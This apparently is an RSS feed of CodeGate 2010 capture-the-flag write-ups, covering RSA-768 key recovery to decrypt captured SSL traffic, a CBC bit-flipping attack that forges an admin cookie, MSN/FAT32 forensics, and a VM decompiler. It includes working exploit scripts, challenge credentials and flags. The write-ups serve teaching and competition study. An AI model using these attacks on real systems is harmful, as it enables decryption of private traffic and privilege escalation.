+  <a style="margin-left: 1em;margin-right: 1em" href="http://lh3.ggpht.com/_BaefoYBtOwQ/S59Mv6OohsI/AAAAAAAAAW4/z7INUja_DtE/challenge7-1.png"><img src="http://lh3.ggpht.com/_BaefoYBtOwQ/S59Mv6OohsI/AAAAAAAAAW4/z7INUja_DtE/challenge7-1.png" border="0" alt="" width="500" height="271" /></a>
+</div>
+
+<div style="text-align: justify">
+  There are 26 packets captured. Packet #4 is a <strong><em>SSL Client Hello</em></strong> packet, but after it, packet #8 and packet #9 have FIN flag. This mean that the session was termininated. So we just ignore them.
+</div>
+
+<div style="text-align: justify">
+  Packet #14 is another <strong><em>SSL Client Hello</em></strong> packet. This is where the real session began. Take a look into it:
+</div>
+
+<div style="clear: both;text-align: center">
+  <a style="margin-left: 1em;margin-right: 1em" href="http://lh4.ggpht.com/_BaefoYBtOwQ/S59PftmaEmI/AAAAAAAAAXA/yxCqiOSmyHA/challenge7-2.png"><img src="http://lh4.ggpht.com/_BaefoYBtOwQ/S59PftmaEmI/AAAAAAAAAXA/yxCqiOSmyHA/challenge7-2.png" border="0" alt="" width="500" height="274" /></a>
+</div>
+
+<div style="text-align: justify">
+  There is nothing special. It is just a normal <strong><em>SSL Client Hello</em></strong> packet. It happens when a client want to connect to a SSL service. We continue look into the packet #16, the <strong><em>SSL Server Hello</em></strong> packet:
+</div>
+
+<div style="clear: both;text-align: center">
+  <a style="margin-left: 1em;margin-right: 1em" href="http://lh6.ggpht.com/_BaefoYBtOwQ/S59SI8VjnhI/AAAAAAAAAXI/LGU0BQZP4x0/s1600/challenge7-3.png"><img src="http://lh6.ggpht.com/_BaefoYBtOwQ/S59SI8VjnhI/AAAAAAAAAXI/LGU0BQZP4x0/s400/challenge7-3.png" border="0" alt="" width="501" height="324" /></a>
+</div>
+
+<div style="clear: both;text-align: left">
+  This is the response for SSL Client Hello packet. We can see some useful information here:
+</div>
+
+<div style="clear: both;text-align: left">
+  - The cipher suite will be used: <strong>RSA_WITH_AES_256_CBC_SHA</strong>
+</div>
+
+<div style="clear: both;text-align: left">
+  - The X509 certificate of the server
+</div>
+
+<div style="clear: both;text-align: justify">
+  In the SSL protocol, the server send its certificate to the client in the handshaking process. This certificate will be used for supporting the key exchange afterward. The certificate contains the server&#8217;s public key and other data. By extracting the public key and recovering the private key from it, we can decrypt the SSL traffic.
+</div>
+
+<div style="clear: both;text-align: justify">
+  <strong><span style="font-family: Georgia,'Times New Roman',serif">Exploit</span></strong>
+</div>
+
+<div style="clear: both;text-align: justify">
+  I wrote some Python code to exploit this challange:
+</div>
+
+<pre class="brush: python; title: ; notranslate" title="">from scapy.all import *
+    from M2Crypto import X509
+
+    def decode_serverhello(packet):
+    payload = packet.load
+    cert = payload[94:1141]
+    cert = X509.load_cert_string(cert, 0)
+    return cert
+
+    def get_pubkey(cert):
+    pubkey = cert.get_pubkey().get_rsa()
+    n = long(pubkey.n.encode('hex')[8:], 16)
+    e = long(pubkey.e.encode('hex')[9:], 16)
+    return n, e
+
+    packets = rdpcap('ssl.pcap')
+    cert = decode_serverhello(packets[15])
+    n,e = get_pubkey(cert)
+</pre>
+
+<p>Because this traffic used RSA as public key algorithm, the public key contains 2 components: <strong>n</strong> and <strong>e</strong>. We get their values from the above code:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">n = 1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413
+    e = 65537
+</pre>
+
+<div style="text-align: justify">
+  In RSA, <strong>n</strong> is the product of 2 big prime numbers <strong>p</strong> and <strong>q</strong>. So, in order to recover the RSA private key from the public key, we must factorize <strong>n</strong> into <strong>p</strong> and <strong>q</strong>. This is the key point of the challenge. In this situation, n is a very big number (232 decimal digits). How can we do that? In the beginning, I didn&#8217;t know how to solve it. But I remembered the hint &#8220;<em>does the modulus look familiar?</em>&#8220;. So I tried <a href="http://bit.ly/azg7Vh">googling it</a> <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_biggrin.gif" alt=":-D" class="wp-smiley" /> (actually just its last digits). And&#8230; oh my god, I was lucky! It is <a href="http://en.wikipedia.org/wiki/RSA_numbers#RSA-768">RSA-768</a>. It&#8217;s factorized just few months ago.
+</div>
+
+<pre class="brush: python; title: ; notranslate" title="">RSA-768 = 33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489
+    × 36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917
+</pre>
+
+<p>So now, we have all components of the RSA keys.</p>
+
+<pre class="brush: python; title: ; notranslate" title="">n = 1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413
+    e = 65537
+    p = 33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489
+    q = 36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917
+    d = 703813872109751212728960868893055483396831478279095442779477323396386489876250832944220079595968592852532432488202250497425262918616760886811596907743384527001944888359578241816763079495533278518938372814827410628647251148091159553
+</pre>
+
+<div style="text-align: justify">
+  The last thing we have to do is generating the RSA private key in PEM format from these components. But how can we do that? As far as I know, popular cryptographic libraries like OpenSSL do not support this. So in this case, I wrote my own tool to do this task. It is based on ASN1. It is a little long to post here. But if you want to write your own one, I recommend <a href="http://pyasn1.sourceforge.net/">pyasn1</a>.
+</div>
+
+<p>After having the private key, just import it to Wireshark to decrypt the SSL traffic:</p>
+
+<div style="clear: both;text-align: center">
+  <a style="margin-left: 1em;margin-right: 1em" href="http://lh6.ggpht.com/_BaefoYBtOwQ/S59zDsyIwPI/AAAAAAAAAXQ/dMd2XsmITRo/s1600/challenge7-4.png"><img src="http://lh6.ggpht.com/_BaefoYBtOwQ/S59zDsyIwPI/AAAAAAAAAXQ/dMd2XsmITRo/s400/challenge7-4.png" border="0" alt="" width="501" height="178" /></a>
+</div>
+
+<p><strong>References</strong><br />
+- SSL/TLS: http://en.wikipedia.org/wiki/Transport_Layer_Security<br />
+- RSA: http://en.wikipedia.org/wiki/RSA</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>CodeGate 2010 &#8211; Challenge 8: Bit-flipping attack on CBC mode</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge-8-bit-flipping-attack-on-cbc-mode.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-03-23T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge-8-bit-flipping-attack-on-cbc-mode.html</guid>
+  <description><![CDATA[
+     <p>Writeup for CodeGate 2010 Challenge 8 by <a href="http://namnham.blogspot.com/" target="_blank">namnx</a></p>
+
+<hr />
+
+<p>This is a web-based cryptography challenge. In this challenge, we were provided a URL and a hint “<em>the first part is just an IV</em>“.</p>
+
+<p>The URL is: <a href="http://ctf1.codegate.org/99b5f49189e5a688492f13b418474e7e/web4.php">http://ctf1.codegate.org/99b5f49189e5a688492f13b418474e7e/web4.php</a>.</p>
+
+<h3 id="analysis">Analysis</h3>
+
+<p>Go to the challenge URL. It will ask you the username for the first time. After we enter a value, for example ‘<span style="font-family: 'Courier New',Courier,monospace">namnx</span>‘, it will return only a single message “<span style="font-family: 'Courier New',Courier,monospace">Hello, namnx!</span>“. Examine the HTTP payload, we will see the cookie returned:</p>
+
+<blockquote>
+  <table>
+    <tbody>
+      <tr>
+        <td>web4_auth=1vf2EJ15hKzkIxqB27w0AA==</td>
+        <td>5X5A0e3r48gXhUXZHEKBa5dpC+XfdVv4oamlriyi5yM=</td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<table>
+  <tbody>
+    <tr>
+      <td>The cookie includes 2 parts delimited by character ‘</td>
+      <td>’. After base64 decode the first part of the cookie, we have a 16-byte value. According to the hint, this is the IV of the cipher. And because it has 16-byte length, I guess that this challenge used AES cipher, and the block size is 16 bytes. Moreover, the cipher has an IV, so it can’t be in ECB mode. I guessed it in CBC mode. The last part is the base64 of a 32-byte value. This is a cipher text. We will exploit this value later.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Browse the URL again, we will receive another message: “<em>Welcome back, namnx! Your role is: user. You need admin role.</em>” Take a look into this message, we can guess the operation of this app: it will receive the cookie from the client, decrypt it to get the user and role information and return the message to the client based on the user and role information. So, in order to get further information, we must have the admin role. This is our goal in this challenge.<strong><span style="font-family: Georgia,'Times New Roman',serif"> </span></strong></p>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>I wrote some Python to work on this challenge easier:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">import urllib, urllib2
+    import base64, re
+
+    url = 'http://ctf1.codegate.org/99b5f49189e5a688492f13b418474e7e/web4.php'
+    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
+
+    def get_cookie(user):
+        headers = { 'User-Agent' : user_agent}
+        values = {'username' : user, 'submit' : "Submit"}
+        data = urllib.urlencode(values)
+        request = urllib2.Request(url, data, headers)
+        response = urllib2.urlopen(request)
+        cookie = response.info().get('Set-Cookie')
+        groups = re.match("web4_auth=(.+)|(.+);.+", cookie).groups()
+        iv = base64.b64decode(groups[0])
+        cipher = base64.b64decode(groups[1])
+        return iv, cipher
+
+    def get_message(iv, cipher):
+        cookie = base64.b64encode(iv) + '|' + base64.b64encode(cipher)
+        cookie = urllib.quote(cookie)
+        cookie = 'web4_auth=' + cookie
+        headers = { 'User-Agent' : user_agent, 'Cookie': cookie}
+        request = urllib2.Request(url, None, headers)
+        response = urllib2.urlopen(request)
+        data = response.read()
+        print repr(data)
+        groups = re.match(".+, (.*)! .+: (.*). You.+", data).groups()
+        return groups[0], groups[1]
+</pre>
+
+<p>The first function, get_cookie will submit a value as a username in the first visit to the page, get the returned cookie, and then parse it to get the IV and cipher. The second function, get_message, do the task like when you visit the page in later times, it parses the response message to get the returned username and role.</p>
+
+<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('123456789012')
+    &gt;&gt;&gt; len(cipher)
+    32
+    &gt;&gt;&gt; iv, cipher = get_cookie('1234567890123')
+    &gt;&gt;&gt; len(cipher)
+    48
+</pre>
+
+<p>When you input the user with a 12-byte value, the returned cipher will have 32 bytes (2 blocks). And when you enter a 13-byte value, the cipher will have 48 bytes (3 blocks). This means that beside the username value, the plain text of the cipher will be added more 20 bytes.</p>
+
+<p>Try altering the cipher text to see how it is decrypted:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('1234567890')
+    &gt;&gt;&gt; cipher1 = cipher[:-1] + '&#092;&#048;0'
+    &gt;&gt;&gt; username, role = get_message(iv, cipher1)
+    'Welcome back, 1234567xa2xc2xcaxfeixdbxee_cxa7xd7x0cxa9jxe0xbb! Your role is: . You need admin role.'
+</pre>
+
+<p>As you can see, the last block of the decrypted role is the first block of the plain text. So, the format of the plain text may be: ‘username=’ + username + [11 bytes].</p>
+
+<p>To here, we can guess that the format of the plain text can be something like:</p>
+
+<blockquote>
+  <p>‘username=’ + username + [delimiter] + [param] + ‘=’ + [value]</p>
+</blockquote>
+
+<p>The last 11 bytes of the plain text can be determined by the code below:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('x00')
+    &gt;&gt;&gt; username, role = get_message(iv, cipher)
+    'Welcome back, x00##role=userx00x00x00x00x00x00x00x00x00x00x00! Your role is: . You need admin role.'
+</pre>
+
+<p>You can see the last 11 bytes of the plain text in the returned message. So, at this time, we can conclude format of the plain text is:</p>
+
+<blockquote>
+  <p>‘username=’ + username + ‘##role=’ + role</p>
+</blockquote>
+
+<p>Now, the last thing we have to do is altering the role value to ‘admin’. Because we’ve already known the format of the plain text, we can choose to input the username close to the target plain text and try to alter the cipher text in the way that the decrypted value is what we want.</p>
+
+<p>Let remind the operation of CBC mode in cryptographic ciphers. In encryption process:</p>
+
+<blockquote>
+  <p>y[1] = C(IV xor x[1])<br />
+y[n] = C(y[n-1] xor x[n])</p>
+</blockquote>
+
+<p>and in the decryption:</p>
+
+<blockquote>
+  <p>x[1] = D(y[1]) xor IV<br />
+x[n] = D(y[n]) xor y[n-1]</p>
+</blockquote>
+
+<p>Notice that if we flip one bit in the (n-1)th block of cipher text, the respective bit in the n-th block of plain text will be also flipped. So, we will you this fact to exploit the challenge:</p>
+
+<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('012345678901234567890123#role=admin')
+    &gt;&gt;&gt; s = cipher[:16] + chr(ord(cipher[16]) ^ 0x10) + cipher[17:]
+    &gt;&gt;&gt; username, role = get_message(iv, s)
+    'Welcome back, 0123456Lxaax17mxe9x91xdcxe2`#z)xd8mxd8x18! Your role is: admin. You need admin role. Congratulations! Here is your flag: the_magic_words_are_squeamish_ossifrage_^-^!!!!!'
+</pre>
+
+<p>Successful! Such an interesting challenge, isn’t it?</p>
+
+<h3 id="references">References</h3>
+
+<ul>
+  <li><a href="http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation" target="_blank">Block cipher modes of operation</a></li>
+  <li><a href="http://en.wikipedia.org/wiki/Bit-flipping_attack" target="_blank">Bit-flipping attack</a></li>
+</ul>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>CodeGate 2010 &#8211; Challenge 6 writeup</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/20/codegate-2010-challenge-6-writeup.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-03-20T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/20/codegate-2010-challenge-6-writeup.html</guid>
+  <description><![CDATA[
+     <h1 id="summary">Summary</h1>
+
+<p>Challenge 6 is a forensics problem with a mountain of data, a packet capture file and a FAT32 filesystem image. In order to find the secret you have to watch for the “key” exchanged via MSN conversation in a packet capture file, then use it to find the secret file name. With forensics problems, luck is more important than techniques and you should only do it if you don’t have anything to play during the game.</p>
+
+<h1 id="analysis">Analysis</h1>
+
+<p>Challenge information:</p>
+
+<blockquote>
+  <p>credentials:</p>
+
+  <p>http://ctf.codegate.org/thisiswhereiuploadmyfiles/CC2A8B4FA2E1FA6BD7FE9B8EFC86BCB7</p>
+
+  <p>Substitute for those who are not in Korea : http://www.mediafire.com/?wyhexdmzzdm</p>
+
+  <p>You should convert the flag into lower case letters and try to auth with it.</p>
+
+  <p>Hint: The packet of messenger is important. You don’t need to care the ftp stuff.</p>
+
+  <p>Hint2: Please put your flag without any extension to the auth page.</p>
+</blockquote>
+
+<h2 id="file-info">File info</h2>
+
+<blockquote>
+  <pre>$ file CC2A8B4FA2E1FA6BD7FE9B8EFC86BCB7
+CC2A8B4FA2E1FA6BD7FE9B8EFC86BCB7: gzip compressed data, from Unix, last modified: Fri Mar 12 17:20:19 2010
+</pre>
+</blockquote>
+
+<p>$ zcat CC2A8B4FA2E1FA6BD7FE9B8EFC86BCB7 &gt; challenge6
+$ file challenge6
+challenge6: POSIX tar archive (GNU)</p>
+
+<p>$ tar xvf challenge6
+352FCD8BDEC8244CDED00CA866CA24B9
+B400CBEA39EA52126E2478E9A951CDE8</p>
+
+<p>$ file 352FCD8BDEC8244CDED00CA866CA24B9 B400CBEA39EA52126E2478E9A951CDE8
+352FCD8BDEC8244CDED00CA866CA24B9: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
+B400CBEA39EA52126E2478E9A951CDE8: x86 boot sector, code offset 0x58, OEM-ID “MSDOS5.0”,
+sectors/cluster 8, reserved sectors 4334, Media descriptor 0xf8, heads 255, sectors 1982464 (volumes &gt; 32 MB) ,
+FAT (32 bit), sectors/FAT 1929, reserved3 0x800000, serial number 0x7886931a, unlabeled&lt;/pre&gt;</p>
+
+<p>We have 2 files: a tcpdump packet capture and a FAT32 filesystem image. From the hints (yes, without it we don’t know what to search for), we focus our search to:</p>
+
+<ul>
+  <li>Final secret key must be a file and it may rely on FAT32 image</li>
+  <li>Keyword to find out that secret file must be exchanged via MSN conversation(s) in tcpdump file</li>
+</ul>
+
+<h2 id="msn-conversation">MSN conversation</h2>
+
+<p>Using chaosreader (you can use other tools to have the same result) to analyse pcap file, we will have a list of sessions like below:</p>
+
+<p><img class="alignnone size-full wp-image-733" title="Chaosreader Report - msnp" src="http://vnsecurity.net/wp/storage/uploads/2010/03/Chaosreader-Report-352FCD8BDEC8244CDED00CA866CA24B9.pcap_1269063206104.png" alt="Chaosreader Report - msnp" width="953" height="173" /></p>
+
+<p>The session number 263 &amp; 264 is MSN chat. Following the conversion by looking in to raw file we find some interesting things:</p>
+
+<blockquote>
+  <p><span style="color: #0000ff">forensic-proof@live.com&gt; i;d like to get a file that i asked you before……<br /> forensic-proof@live.com&gt; now availabel?</span></p>
+
+  <p><span style="color: #ff0000">securityholic@hotmail.com&gt; ah<br /> securityholic@hotmail.com&gt; ok wait a min <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /><br /> </span><br />
+[… MSN P2P file transfer session …]</p>
+
+  <p><span style="color: #0000ff">forensic-proof@live.com&gt; thanks….<br /> </span><br />
+<span style="color: #ff0000">securityholic@hotmail.com&gt; this is between you and me :-/</span></p>
+</blockquote>
+
+<p>It looks like they exchange some “secret” via MSN P2P file transfer. Looking at file transfer session (refer to References for MSN protocol) :</p>
+
+<blockquote>
+  <p>To: &lt;msnmsgr:securityholic@hotmail.com;{95178158-37b6-45ce-b332-2042a4d27563}&gt;<br />
+From: &lt;msnmsgr:forensic-proof@live.com;{281f2818-580b-46f0-909f-c009de526642}&gt;<br />
+Via: MSNSLP/1.0/TLP ;branch={51D93360-BFBD-40CB-AD0A-2D7FB5C28031}<br />
+CSeq: 1<br />
+Call-ID: {71021C00-FE1C-4E91-B415-D2145D7C1C24}<br />
+Max-Forwards: 0<br />
+Content-Type: application/x-msnmsgr-transrespbody<br />
+Content-Length: 482</p>
+
+  <p>Listening: true<br />
+NeedConnectingEndpointInfo: false<br />
+Conn-Type: Direct-Connect<br />
+TCP-Conn-Type: Direct-Connect<br />
+IPv6-global: 2001:0:cf2e:3096:2036:1131:5c67:c1c5<br />
+UPnPNat: false<br />
+Capabilities-Flags: 1<br />
+<strong>srddA-lanretnI4vPI: 85.26.251.361<br />
+troP-lanretnI4vPI: 2133</strong><br />
+IPv6-Addrs: 2001:0:cf2e:3096:2036:1131:5c67:c1c5 2002:a398:3e3a::a398:3e3a<br />
+IPv6-Port: 3313<br />
+Nat-Trav-Msg-Type: WLX-Nat-Trav-Msg-Direct-Connect-Resp<br />
+Bridge: TCPv1<br />
+Hashed-Nonce: {E3759BB3-EED9-04F3-3B1A-56044619D59F}</p>
+</blockquote>
+
+<p>What the hell is this: **srddA-lanretnI4vPI: 85.26.251.361? **It’s reversed! So, file transfer session has this information: **IPv4Internal-Addrs: 163.152.62.58, IPv4Internal-Port: 3312. **It’s confirmed by looking at chaosreader output:</p>
+
+<p><img class="alignnone size-full wp-image-734" title="Chaosreader Report- 3312" src="http://vnsecurity.net/wp/storage/uploads/2010/03/Chaosreader-Report-352FCD8BDEC8244CDED00CA866CA24B9.pcap_1269063302409.png" alt="Chaosreader Report- 3312" width="914" height="21" /></p>
+
+<p>Let dump that session and use tcpxtract to extract files from the pcap:</p>
+
+<blockquote>
+  <pre>$ tcpdump -nn -r 352FCD8BDEC8244CDED00CA866CA24B9 'port 3312' -w 3312.pcap</pre>
+
+  <pre>$ tcpxtract -f 3312.pcap
+ Found file of type "pdf" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000001.pdf
+ Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000008.jpg
+ Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000009.jpg
+ Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000010.jpg
+ Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000011.jpg
+ Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000012.jpg
+ Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000013.jpg
+ Found file of type "jpg" in session [163.152.62.59:37390 -&gt; 163.152.62.58:61452], exporting to 00000014.jpg</pre>
+</blockquote>
+
+<p>During the game, we opened PDF file but it’s just blank then we focused on JPG files, but no luck. Re-examined the blank PDF, by “Select All” we found there’s hidden text at the bottom of  the page: **CC105EE2A139A631175571452968D637. **Looks like a “key” – checksum of the secret file.</p>
+
+<p>Searching on FA32 filesystem image for that checksum:</p>
+
+<blockquote>
+  <pre>$ sudo mount -o loop,ro B400CBEA39EA52126E2478E9A951CDE8 /mnt/loop
+</pre>
+</blockquote>
+
+<p>$ find /mnt/loop -type f -exec md5sum {} ; &gt;&gt; md5sum.txt</p>
+
+<p>$ grep -i CC105EE2A139A631175571452968D637 md5sum.txt
+cc105ee2a139a631175571452968d637  /mnt/loop/hqksksk/iologmsg.dat&lt;/pre&gt;</p>
+
+<p>Matched! Finally, the secret key is: **iologmsg. **We’re just lucky!</p>
+
+<p>Now, look back to the hint “You should convert the flag into lower case letters and try to auth with it.”, it sounds irrelevant or the md5sum was the correct key at first?</p>
+
+<h1 id="references">References</h1>
+
+<ul>
+  <li><a href="http://msnpiki.msnfanatic.com/index.php/MSNC:MSNSLP" target="_blank">http://msnpiki.msnfanatic.com/index.php/MSNC:MSNSLP</a></li>
+  <li><a href="http://www.hypothetic.org/docs/msn/client/file_transfer.php" target="_blank">http://www.hypothetic.org/docs/msn/client/file_transfer.php</a></li>
+  <li><a href="http://chaosreader.sourceforge.net/" target="_blank">http://chaosreader.sourceforge.net/</a></li>
+  <li><a href="http://tcpxtract.sourceforge.net/" target="_blank">http://tcpxtract.sourceforge.net/</a></li>
+</ul>
+
+<p>Keywords: network forensics, msn protocol, codegate 2010</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>No CodeGate 2010 CTF final for CLGT</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/20/no-codegate-2010-ctf-final-for-clgt.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-03-20T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/20/no-codegate-2010-ctf-final-for-clgt.html</guid>
+  <description><![CDATA[
+     <p>Due to the budget problem, we will not join the final round of CodeGate 2010 CTF in Seoul next month.</p>
+
+<p>Good luck to the other teams and enjoy the game.</p>
+
+<p>-CLGT Team</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>CodeGate 2010 Challenge 2 – Xbox pwned</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/19/codegate-2010-challenge2-xbox-pwned.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-03-19T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/19/codegate-2010-challenge2-xbox-pwned.html</guid>
+  <description><![CDATA[
+     <h1 id="summary">Summary</h1>
+
+<p>This is the most interesting challenge in CodeGate 2010 IMHO. The binary is a VM which loads the <em>‘codefile’</em> and execute it. The VM <em>codefile</em> is protected from being tampered with a TEA based hash algorithm. By exploiting the weakness of hash algorithm (similar to Xbox hack) together with a bug inside VM, we could change the execution flow of VM code to get back the secret key content.</p>
+
+<h1 id="analysis">Analysis</h1>
+
+<p>Challenge information</p>
+
+<blockquote>
+  <p>credentials: ssh hugh@ctf4.codegate.org -p 9474 password=takeitaway<br />
+Exploit /home/hugh/yboy to read secret.key</p>
+</blockquote>
+
+<p>There are <em>yboy</em>, <em>codefile</em> and <em>secret.key</em> files in the home directory of hugh (you can download these files <a href="http://force.vnsecurity.net/download/rd/yboy.tgz">here</a> if you want to try it by yourself)</p>
+
+<blockquote>
+  <p>-rw-r–r– 1 codegate codegate 1136 2010-03-12 14:45 codefile<br />
+-r——– 1 daryl daryl 140 2010-03-12 15:27 secret.key<br />
+-rwsr-xr-x 1 daryl root 22307 2010-03-12 16:07 yboy</p>
+</blockquote>
+
+<h3 id="a-reverse-engineering-yboy">a. Reverse Engineering yboy</h3>
+
+<p><em>yboy</em> basically does the following things</p>
+
+<ul>
+  <li>load VM codes from the codefile into memory (code[])</li>
+  <li>load content of secret.key into memory (data[])</li>
+  <li>check for the integrity of codefile using TEA based hash algorithm against a hard-coded hash value. Exit if the hash not matched</li>
+  <li>parse/decode loaded VM codes and execute it accordingly</li>
+</ul>
+
+<p>For the VM code inside codefile</p>
+
+<ul>
+  <li>ask user to input password</li>
+  <li>compare the input with flag inside secret.key</li>
+  <li>if correct, print out the flag</li>
+  <li>otherwise, print out access denied error and exit</li>
+</ul>
+
+<p><strong>b. Decompiler for codefile</strong></p>
+
+<p>Since <em>yboy</em> load VM code from <em>codefile</em> and execute it, I wrote a decompiler for it</p>
+
+<pre class="brush: cpp; title: ; notranslate" title="">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+unsigned char *decode[32] = {
+        "halt", "push", "pop", "add", "sub", "or", "xor", "nor", "shl",
+        "shr", "not", "nop", "branch", "jumpreg", "callreg", "load",
+        "store", "halt", "inputchar", "outputchar", "set_imm", "reload",
+        "rrandom", "nop", "nop", "nop", "nop", "nop", "nop", "nop", "nop",
+        "nop",
+};
+
+unsigned long registers[64];
+unsigned long code[32768];
+unsigned int PC;
+
+int main(int argc, char **argv)
+{
+        unsigned int ins;
+        unsigned char reg;
+        unsigned char imm1, imm2;
+        unsigned char opcode;
+
+        unsigned int codesize;
+        int set_imm = 1;
+        FILE *f;
+
+        f = fopen(argv[1], "r");
+        codesize = fread(code, 1, sizeof(code), f);
+        fclose(f);
+        //check_code();
+
+        PC = 0;
+        while (PC &lt; (codesize) / 4) {
+                set_imm = 1;
+                ins = code[PC];
+
+                opcode = (ins &gt;&gt; 24);   //&amp; 0x1f;
+                reg = (ins &gt;&gt; 16) &amp; 0xFF;
+                imm1 = (ins &gt;&gt; 8) &amp; 0xFF;
+                imm2 = (unsigned char) ins;
+
+                // set_imm
+                if (opcode == 20) {
+                        printf("%04x: tr%d = %s %x, %x", PC, reg,
+                            decode[opcode &amp; 0x1f], imm1, imm2);
+
+                        if (imm2 &amp;&amp; !imm1)
+                                printf("t; %c", imm2);
+                        else if (imm1)
+                                printf("t; %04x", imm2 + (imm1 &lt;&lt; 8));
+
+                        printf("n");
+                        PC++;
+                        continue;
+                }
+
+                reg = (ins &gt;&gt; 16) &amp; 0xBF;
+                imm1 = (ins &gt;&gt; 8) &amp; 0xBF;
+                imm2 = ins &amp; 0xBF;
+
+                printf("%04x: tr%d = %s r%d, r%d", PC, reg,
+                    decode[opcode &amp; 0x1f], imm1, imm2);
+
+                if (opcode == 12)       // comment for branch
+                        printf("t; if (r%d) goto r%dn", imm1, imm2);
+                else
+                        printf("n");
+
+                PC++;
+        }
+        return 0;
+}
+</pre>
+
+<p>Here is the output of the decompiler (click to open)</p>
+
+<pre class="brush: cpp; collapse: true; light: false; title: ; toolbar: true; notranslate" title="">rd@jps(~/working/ctf/codegate2010/2/)$ ./yboy-decompile codefile
+0000:   r1 = set_imm 0, 45      ; E
+0001:   r0 = outputchar r1, r0
+0002:   r1 = set_imm 0, 6e      ; n
+0003:   r0 = outputchar r1, r0
+0004:   r1 = set_imm 0, 74      ; t
+0005:   r0 = outputchar r1, r0
+0006:   r1 = set_imm 0, 65      ; e
+0007:   r0 = outputchar r1, r0
+0008:   r1 = set_imm 0, 72      ; r
+0009:   r0 = outputchar r1, r0
+000a:   r1 = set_imm 0, 20      ;
+000b:   r0 = outputchar r1, r0
+000c:   r1 = set_imm 0, 70      ; p
+000d:   r0 = outputchar r1, r0
+000e:   r1 = set_imm 0, 61      ; a
+000f:   r0 = outputchar r1, r0
+0010:   r1 = set_imm 0, 73      ; s
+0011:   r0 = outputchar r1, r0
+0012:   r1 = set_imm 0, 73      ; s
+0013:   r0 = outputchar r1, r0
+0014:   r1 = set_imm 0, 77      ; w
+0015:   r0 = outputchar r1, r0
+0016:   r1 = set_imm 0, 6f      ; o
+0017:   r0 = outputchar r1, r0
+0018:   r1 = set_imm 0, 72      ; r
+0019:   r0 = outputchar r1, r0
+001a:   r1 = set_imm 0, 64      ; d
+001b:   r0 = outputchar r1, r0
+001c:   r1 = set_imm 0, 3e      ; &gt;
+001d:   r0 = outputchar r1, r0
+001e:   r1 = set_imm 0, 3e      ; &gt;
+001f:   r0 = outputchar r1, r0
+0020:   r60 = set_imm 0, ff     ; �
+0021:   r61 = set_imm 0, 1      ;
+0022:   r4 = set_imm 5, 39      ; 0539
+0023:   r3 = inputchar r0, r0
+0024:   r50 = set_imm 0, a      ;
+0025:   r0 = store r4, r3
+0026:   r0 = nop r0, r0
+0027:   r10 = sub r3, r50
+0028:   r10 = not r10, r0
+0029:   r11 = set_imm 0, 2f     ; /
+002a:   r0 = branch r10, r11    ; if (r10) goto r11
+002b:   r4 = add r61, r4
+002c:   r10 = sub r60, r3
+002d:   r11 = set_imm 0, 23     ; #
+002e:   r0 = branch r10, r11    ; if (r10) goto r11
+002f:   r19 = set_imm 5, 39     ; 0539
+0030:   r20 = set_imm 0, 0
+0031:   r21 = set_imm 0, 23     ; #
+0032:   r21 = sub r21, r20
+0033:   r21 = not r21, r0
+0034:   r22 = set_imm 0, 5e     ; ^
